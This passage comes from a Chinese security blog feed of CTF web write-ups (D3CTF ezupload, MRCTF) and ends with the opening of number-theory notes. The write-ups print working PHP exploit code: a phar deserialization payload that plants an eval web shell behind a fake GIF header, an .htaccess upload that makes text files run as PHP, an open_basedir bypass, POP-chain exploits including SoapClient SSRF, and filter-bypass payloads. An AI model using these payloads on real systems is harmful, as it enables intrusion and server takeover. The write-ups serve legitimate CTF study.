&#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.jpg&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将生成的phar文件重命名为1，gzip压缩后上传到内网服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 28396 &#x2F;var&#x2F;www&#x2F;html&#x2F;1.gz root@node3.buuoj.cn:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure><p>然后上传文件</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428091635909.png" alt></p><p>触发反序列化，得到实际文件路径为：<code>/var/www/html/6dfe08eda761bd32/upload/48cd8b43081896fbd0931d204f947663</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428091742661.png" alt></p><p>构造shell如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dir&#123;</span><br><span class="line">    public $userdir;</span><br><span class="line">    public $url;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">$this-&gt;filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;67e103b0761e6068&#x2F;upload&#x2F;48cd8b43081896fbd0931d204f947663&#x2F;lanxiaojun&#39;;</span><br><span class="line">    $this-&gt;userdir &#x3D; &#39;zzzzzzzzz&lt;?php eval($_POST[&quot;xxx&quot;]); ?&gt;zzzzzzzzzzz&#39;;</span><br><span class="line">    </span><br><span class="line">    $this-&gt;url &#x3D; &#39;1&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; new dir();</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line">$phar &#x3D; new Phar(&quot;lanxiaojun.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89A&quot;.&quot;__HALT_COMPILER();&quot;); &#x2F;&#x2F;设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($d); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.jpg&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意的是我们用gzip压缩的时候，刚好含有一些特殊字符，如<code>\</code>等，可以在原来的数据中增加一些额外的数据来绕过。同样的方法上传，触发反序列化。</p><p>接着是上传<code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>访问shell的页面，绕过<code>open_basedir和disable_function</code>，拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));echo file_get_contents(&#39;F1aG_1s_H4r4&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428092222247.png" alt="image-20200428092222247"></p><p>参考资料：</p><blockquote><p><a href="https://glotozz.github.io/2020/04/02/buuctf-wp/#d3ctf-2019ezupload" target="_blank" rel="noopener">https://glotozz.github.io/2020/04/02/buuctf-wp/#d3ctf-2019ezupload</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104423207" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104423207</a></p><p><a href="https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot;&gt;&lt;a href=&quot;#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PWNHUB 公开赛 2018]傻 f
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF复盘题解</title>
    <link href="http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-31T00:04:00.000Z</published>
    <updated>2020-04-02T15:46:03.229Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>第一层数组绕过，第二层弱类型比较绕过</p><h4 id="0x-02-你传你🐎呢"><a href="#0x-02-你传你🐎呢" class="headerlink" title="0x 02 你传你🐎呢"></a>0x 02 你传你🐎呢</h4><p>上传.htaccess绕过</p><h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFF伪造127.0.0.1得到flag</p><h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol><li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li><li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li><li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li><li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li></ol><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure><h4 id="0x-05-套娃"><a href="#0x-05-套娃" class="headerlink" title="0x 05 套娃"></a>0x 05 套娃</h4><ul><li>第一关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure><p>第一层匹配了<code>_</code>符号和它的url编码值，有如下方法绕过：</p><ol><li>%5F</li><li>b.u.p.t（点代替_）</li><li>b u p t（空格代替_）</li></ol><p>第二层换行污染绕过，最终payload：?b.u.p.t=23333%0a</p><ul><li>第二关</li></ul><p>伪造本地访问得到jsfuck提示<code>post me Merak</code>，post一个Merak参数得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>用<code>data://</code>或者<code>php://input</code>伪协议绕过,根据加密脚本可以编写出dechange函数，得到<code>ZmpdYSZmXGI=</code>，最终发包得到flag</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p><h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag" target="_blank" rel="noopener">www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag</a></p><h4 id="0x-07-Ezpop-Revenge"><a href="#0x-07-Ezpop-Revenge" class="headerlink" title="0x 07 Ezpop_Revenge"></a>0x 07 Ezpop_Revenge</h4><p>var/Typecho/Plugin.php</p><p>激活插件方法处得到绑定的url</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223613501.png" alt></p><p>首先根据题意全局搜索unserialize,路径为usr/plugins/HelloWorld/Plugin.php中找到反序列化点</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214718378.png" alt></p><p>首先看到这里：</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214946669.png" alt></p><p>找到入口点，跟进Typecho_Db::__construct</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215208957.png" alt></p><p>存在字符串拼接，全局搜索寻找__tostring()魔术方法</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215545678.png" alt></p><p>我们选择var/Typecho/Db/Query.php作为跳板</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215659239.png" alt></p><p>如果$this-&gt;_sqlPreBuild[‘action’]=SELECT就调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>如果令$this-&gt;_adapter为Soapclient实例，触发_call完成ssrf</p><p>pop链构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeup–&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)–&gt;</span><br><span class="line">Typecho_Db_Query::__construct–&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)–&gt;</span><br><span class="line">__call()进行ssrf</span><br></pre></td></tr></table></figure><p>exp构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;coincidence&#x3D;([&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;</span><br><span class="line">        $headers &#x3D; array(</span><br><span class="line">            &#39;Cookie: PHPSESSID&#x3D;ubcj94u08mcaodg4g1e0nooam2&#39;,</span><br><span class="line">        );</span><br><span class="line">        $this-&gt;_adapter&#x3D;new SoapClient(</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers)),&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; serialize(new HelloWorld_DB());</span><br><span class="line">echo base64_encode($a);</span><br></pre></td></tr></table></figure><p>访问/page_admin?admin=1，post提交base64编码的结果得到flag</p><ul><li>后记</li></ul><p>在入口处存在一则过滤，其中过滤了百分号，由于经过base64编码后在解码没有百分号了，所以不需要绕过</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223309609.png" alt></p><p>假设我们需要绕过%分号该如何绕过呢？答案是需要用\00来代替%00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 PHP5 最新的 CVS 中，</span><br><span class="line">新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：</span><br><span class="line">string 型数据（字符串）新的序列化格式为：</span><br><span class="line">S:&quot;&lt;length&gt;&quot;:&quot;&lt;value&gt;&quot;;</span><br><span class="line">其中 &lt;length&gt; 是源字符串的长度，而非 &lt;value&gt; 的长度。&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为经过转义之后的字符串。</span><br><span class="line">它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 &lt;value&gt; 的内容了。</span><br></pre></td></tr></table></figure><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br> 而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”。</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225703750.png" alt></p><p>将不可见字符%00转化为十六进制，大S成功执行wakeup</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402230042727.png" alt></p><p>小写s则失败</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225923011.png" alt></p><p>转换脚本，参考颖奇师傅的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr &#x3D; explode(&#39;:&#39;, $str);</span><br><span class="line">    $newstr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;00&#x2F;&#39;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] &#x3D; preg_replace(&#39;&#x2F;s&#x2F;&#39;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .&#x3D; $arr[$i];</span><br><span class="line">        $newstr .&#x3D; &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .&#x3D; $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/105189436" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/105189436</a></p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p><a href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ez-bypass&quot;&gt;&lt;a href=&quot;#0x-01-Ez-bypass&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="MRCTF" scheme="http://yoursite.com/tags/MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息安全数学基础学习笔记</title>
    <link href="http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-27T15:54:26.000Z</published>
    <updated>2020-04-06T12:44:14.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一章-整数的可除性"><a href="#第一章-整数的可除性" class="headerlink" title="第一章 整数的可除性"></a>第一章 整数的可除性</h3><h4 id="0x-01-广义欧几里得除法-求最大公因数"><a href="#0x-01-广义欧几里得除法-求最大公因数" class="headerlink" title="0x  01 广义欧几里得除法 求最大公因数"></a>0x  01 广义欧几里得除法 求最大公因数</h4><ul><li>基础定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200331224130106.png" alt></p><ul><li>实现过程</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20180410203051218.png" alt></p><ul><li>python代码实现</li></ul><h4 id="0x-02-贝祖（Bezout）等式"><a href="#0x-02-贝祖（Bezout）等式" class="headerlink" title="0x 02 贝祖（Bezout）等式"></a>0x 02 贝祖（Bezout）等式</h4><ul><li>基本定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401114721981.png" alt></p><ul><li>求解等式</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121714567.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121756609.png" alt></p><h4 id="0x-03-最大公因数进一步性质"><a href="#0x-03-最大公因数进一步性质" class="headerlink" title="0x 03 最大公因数进一步性质"></a>0x 03 最大公因数进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401221905664.png" alt></p><h4 id="0x-04-整数的进一步性质"><a href="#0x-04-整数的进一步性质" class="headerlink" title="0x 04 整数的进一步性质"></a>0x 04 整数的进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222233184.png" alt></p><h4 id="0x-05-算术基本定理与素数定理"><a href="#0x-05-算术基本定理与素数定理" class="headerlink" title="0x 05 算术基本定理与素数定理"></a>0x 05 算术基本定理与素数定理</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401193511202.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222410868.png" alt></p><h3 id="第二章-同余"><a href="#第二章-同余" class="headerlink" title="第二章 同余"></a>第二章 同余</h3><h4 id="0x-01-同余的基本概念和性质"><a href="#0x-01-同余的基本概念和性质" class="headerlink" title="0x 01 同余的基本概念和性质"></a>0x 01 同余的基本概念和性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403222304291.png" alt></p><p><img 